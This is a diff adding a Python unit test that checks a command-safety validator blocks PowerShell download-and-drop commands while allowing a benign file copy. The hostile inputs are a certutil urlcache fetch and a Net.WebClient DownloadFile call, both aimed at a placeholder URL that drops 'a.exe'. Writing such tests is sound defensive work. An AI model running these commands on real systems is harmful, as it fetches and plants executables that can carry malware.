@@ -168,6 +168,22 @@ class TestSecurity:
             ["grep", "-e", "pattern", "file.txt"]
         ) is None
 
+    def test_blocks_download_drop_vectors(self):
+        assert check_dangerous_command(
+            ["powershell", "-Command", "certutil -urlcache -split -f http://x a.exe"]
+        ) is not None
+        assert check_dangerous_command(
+            [
+                "powershell",
+                "-Command",
+                "(New-Object Net.WebClient).DownloadFile('http://x','a.exe')",
+            ]
+        ) is not None
+        # Legitimate file copy must not hard-block
+        assert check_dangerous_command(
+            ["powershell", "-Command", "Copy-Item a.txt b.txt"]
+        ) is None
+
     def test_blocks_indiscriminate_tauri_app_kill(self):
         from remedy.core.security import check_host_self_kill
 
